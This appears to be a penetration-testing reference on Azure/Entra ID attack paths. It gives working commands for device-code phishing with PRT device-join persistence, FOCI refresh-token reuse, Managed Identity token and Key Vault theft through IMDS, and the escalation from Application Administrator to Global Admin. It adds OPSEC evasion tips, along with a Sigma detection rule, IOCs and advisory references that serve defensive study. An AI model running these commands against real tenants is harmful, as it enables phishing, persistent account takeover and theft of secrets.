# Azure / Entra ID Attack Paths

CWE-287 (Improper Authentication), CWE-613 (Insufficient Session Expiration), CWE-269, CWE-441.
ATT&CK: T1528 (Steal Application Access Token), T1550.001 (Application Access Token),
T1098.001/.003 (Additional Cloud Credentials / Roles), T1606.002, T1078.004.

## Theory / Mechanism

Entra ID (Azure AD) issues OAuth tokens. The most powerful is the **Primary Refresh Token (PRT)**,
bound to a registered device, which can mint access tokens for *any* Entra-connected app/site and
survives password resets. Attacks therefore aim at: (1) phishing tokens without touching the
password (device-code flow), (2) escalating a token into a **device join → PRT** for persistence,
(3) abusing **Managed Identities** on compromised Azure compute, and (4) abusing directory roles
like **Application Administrator** to backdoor service principals up to Global Admin.

## 1. Device-code phishing → PRT (Storm-2372, Aug 2024 → 2025)

Device-code flow is meant for input-constrained devices: the app requests a code, the user enters
it at `https://microsoft.com/devicelogin` and authenticates **on the real Microsoft domain**. The
attacker just initiates the flow and harvests the resulting tokens — so MFA and password are
satisfied legitimately and **MFA strength does not stop it**.

Storm-2372 (Russia-aligned) ran this at scale with Teams/Signal/WhatsApp lures. The key escalation:
they request the device-code token using the **Microsoft Authentication Broker** client ID
`29d9ed98-a469-4536-ade2-f981bc1d605e`, whose refresh token can call the device-registration
service to **register an attacker-controlled device**, then obtain a **PRT** → persistent,
MFA-resistant access.

```bash
# Authorized phishing engagement only. Our helper drives the whole flow + device-join path.
python3 ../scripts/entra_device_code_phish.py \
  --resource https://graph.microsoft.com \
  --client-id 29d9ed98-a469-4536-ade2-f981bc1d605e   # Auth Broker -> device-join -> PRT
```

Manual flow:

```bash
# 1. Start device code (Auth Broker client)
RESP=$(curl -s -X POST \
  "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
  -d "client_id=29d9ed98-a469-4536-ade2-f981bc1d605e" \
  -d "scope=https://graph.microsoft.com/.default offline_access")
echo "$RESP" | jq -r '.message'   # send the user_code/verification_uri in your lure
DC=$(echo "$RESP" | jq -r '.device_code')

# 2. Poll for token after victim authenticates
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
  -d "client_id=29d9ed98-a469-4536-ade2-f981bc1d605e" \
  -d "device_code=$DC" | jq

# 3. Device join + PRT: drive with ROADtools
roadtx gettokens --device-code           # or use the harvested refresh_token
roadtx device -a register -n pwned-laptop # register actor device in tenant
roadtx prt -r <refresh_token>             # obtain a PRT for the registered device
```

## 2. FOCI — Family of Client IDs token amplification

~16 first-party Microsoft client IDs form a "family": a refresh token issued to **any** of them can
be redeemed for an access token to **any other** without re-prompting. Steal a token from Azure CLI
and you can mint tokens for Teams, Outlook, OneDrive, Graph, etc. Industrialized by TeamFiltration
(UNK_SneakyStrike, 80k+ accounts since Dec 2024) and frameworks SquarePhish2 / Graphish (2025).

```bash
# Redeem a FOCI refresh token against a different family client (e.g. Teams):
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "grant_type=refresh_token" \
  -d "client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264" \
  -d "refresh_token=$RT" \
  -d "scope=https://graph.microsoft.com/.default" | jq -r '.access_token'
# roadtx makes this trivial: roadtx refreshtokento <client> -r <rt>
```

## 3. Managed Identity (MI) abuse on compromised Azure compute

A VM/App Service/Function/Container with an assigned MI can request tokens for Key Vault, Storage,
Graph, ARM — see imds-metadata-ssrf.md for the IMDS endpoint. Blast radius routinely reaches
Key Vault, Storage Accounts, Entra ID and even M365 (Exchange Online).

```bash
# Token for ARM, then enumerate what the MI can do
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r .access_token)
az login --identity                       # if az is present on the box
az role assignment list --all --query "[?principalId=='<MI_OBJECT_ID>']"
# Key Vault loot:
KV=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | jq -r .access_token)
curl -s -H "Authorization: Bearer $KV" "https://VAULT.vault.azure.net/secrets?api-version=7.4" | jq
```

## 4. Application Administrator → service principal → Global Admin (dirkjanm; by design)

`Application Administrator` (and the on-prem Sync account) can **add credentials to any existing
service principal**. If a target SP holds a high-privilege role (e.g. `Privileged Role
Administrator`, or Graph perms `RoleManagement.ReadWrite.Directory` / `AppRoleAssignment.ReadWrite.All`),
add a secret/cert, authenticate as the SP, and grant yourself Global Admin. MSRC considers this
documented behavior, not a bug. Adding creds to an **existing** privileged SP is also a classic
persistence technique (Solorigate/Nobelium).

```bash
# Map the path first (read-only enum with AzureHound -> BloodHound):
azurehound -i <tenant_id> --token "$GRAPH_TOKEN" list -o azurehound.json
# (Import azurehound.json into BloodHound CE; look for AZAddSecret / AZGlobalAdmin edges.)

# Add a password to a target SP (requires Application Administrator)
APPID=<target_app_id>
az ad app credential reset --id $APPID --append --years 1 \
  --query '{appId:appId, password:password, tenant:tenant}'

# Authenticate as the service principal
az login --service-principal -u $APPID -p <password> --tenant <tenant_id>

# If the SP has Privileged Role Administrator, assign Global Admin to your user
az rest --method POST \
  --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  --body '{"principalId":"<your_user_object_id>",
           "roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10",
           "directoryScopeId":"/"}'
```

Stealth note: when abusing first-party apps, Entra audit logs attribute the action to the
**application**, not the Application Administrator. The portal hides backdoor SP credentials, but
Graph / AAD Graph APIs reveal them.

## Detection

```yaml
title: Entra Device-Code Auth + Auth Broker Device Registration
id: a7f3e1b2-entra-devicecode-prt
status: experimental
logsource:
  product: azure
  service: signinlogs
detection:
  devicecode:
    authenticationProtocol: deviceCode
  authbroker:
    appId: '29d9ed98-a469-4536-ade2-f981bc1d605e'   # Microsoft Authentication Broker
  condition: devicecode or authbroker
level: high
falsepositives: [legitimate device-code use on shared/kiosk devices]
```

- Sentinel: device-code sign-ins from anomalous geo/ASN; new device registration shortly after a
  device-code login by the Auth Broker client.
- Entra audit logs: `Add service principal credentials` / `Update application – Certificates and
  secrets`, any `Add member to role` for Global Administrator / Privileged Role Administrator.
- MI abuse: token requested via IMDS that mismatches the resource's normal callers; the same MI
  access token used from multiple or non-Azure IPs (token replay).

IOCs: Auth Broker client `29d9ed98-...` in sign-ins; unexpected device joins; new SP secrets on
high-privilege apps; FOCI cross-client refresh redemptions; AzureHound's Graph call pattern (used
by Storm-0501, Void Blizzard in 2025).

## OPSEC

- Device-code phishing leaves a normal-looking interactive sign-in on the **legit** Microsoft
  domain — low user suspicion — but the sign-in log still records `authenticationProtocol=deviceCode`.
- A registered device + PRT is **MFA- and password-reset-resistant** persistence; it is also the
  highest-value detection target. Use a plausible device name; expect Intune/compliance CA to break
  it if enforced.
- Adding SP credentials is attributed to the app, not you — quiet, but creates a durable artifact;
  remove the credential during cleanup.
- AzureHound only reads (same APIs as legit tooling); detection focuses on the **stolen credential's
  Graph activity**, so minimize unusual Graph enumeration volume.

## References

- Microsoft Security Blog, "Storm-2372 conducts device code phishing campaign" (2025-02-13) — https://www.microsoft.com/en-us/security/blog/2025/02/13/storm-2372-conducts-device-code-phishing-campaign/
- dirkjanm.io, "Phishing for Primary Refresh Tokens and Windows Hello keys" — https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/
- dirkjanm.io, "Azure AD privilege escalation - Application Admin" — https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/
- Hunters / Team Axon, "Abusing Azure Managed Identities" — https://www.hunters.security/en/blog/abusing-azure-managed-identities-nhi-attack-paths
- Unit 42, "Cloud Discovery With AzureHound" (Storm-0501, Void Blizzard) — https://unit42.paloaltonetworks.com/threat-actor-misuse-of-azurehound/
- ROADtools / roadtx — https://github.com/dirkjanm/ROADtools
